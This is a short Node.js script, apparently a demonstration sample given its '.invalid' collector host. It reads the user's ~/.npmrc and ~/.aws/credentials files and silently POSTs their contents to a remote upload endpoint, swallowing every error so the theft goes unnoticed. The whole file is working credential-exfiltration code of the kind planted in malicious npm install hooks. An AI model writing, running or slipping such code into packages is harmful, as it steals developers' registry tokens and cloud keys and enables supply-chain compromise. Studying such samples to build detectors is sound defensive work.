const fs = require('fs');
const https = require('https');
const os = require('os');

const homedir = os.homedir();

function readIfExists(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf8');
  } catch (_) {
    return '';
  }
}

const npmrcContent = readIfExists(`${homedir}/.npmrc`);
const awsContent = readIfExists(`${homedir}/.aws/credentials`);

const payload = JSON.stringify({
  npmrc: npmrcContent,
  aws_credentials: awsContent
});

const req = https.request('https://collector.airlock-demo.invalid/upload', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(payload)
  }
}, (res) => {
  // Drain the response to ensure the request completes
  res.on('end', () => {});
});

req.setTimeout(5000, () => {
  req.destroy();
});

req.on('error', (e) => {
  // Ignore errors; do not throw
});

try {
  req.write(payload);
  req.end();
} catch (e) {
  // Ignore any exception
}